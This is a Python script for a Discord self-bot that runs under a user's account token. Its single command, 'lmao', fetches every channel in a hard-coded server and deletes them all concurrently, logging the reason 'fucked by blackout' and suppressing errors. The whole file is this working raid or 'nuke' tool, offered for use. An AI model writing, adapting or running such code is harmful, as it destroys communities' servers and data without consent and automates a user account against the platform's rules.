import discord, datetime, asyncio, json, os, sys, aiohttp
from discord.ext import commands
from webserver import keep_alive

token=""
prefix = ">"

os.system('cls' if os.name == 'nt' else 'clear')

intents = discord.Intents.all()
intents.members = True

headers = {'Authorization': f'{token}'}
client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(
        name='Leveragers ON TOP!',
        url='https://discord.gg/programmers'))


@client.command()
async def lmao(ctx):
    await ctx.message.delete()
    server_id = "1321089517720965153"
    auth_headers = {'Authorization': f'{token}'}

    async def fetch_channels(session):
        url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
        async with session.get(url, headers=auth_headers) as response:
            if response.status == 200:
                return await response.json()
            return []

    async def delete_channel(session, channel_id):
        url = f'https://discord.com/api/v9/channels/{channel_id}'
        try:
                        await session.delete(url, headers={**auth_headers, 'X-Audit-Log-Reason': 'fucked by blackout'})
        except Exception:
            pass

    async with aiohttp.ClientSession() as session:
        channels = await fetch_channels(session)
        if not channels:
            return
        await asyncio.gather(*[delete_channel(session, ch['id']) for ch in channels])


keep_alive()
client.run(token, bot=False)
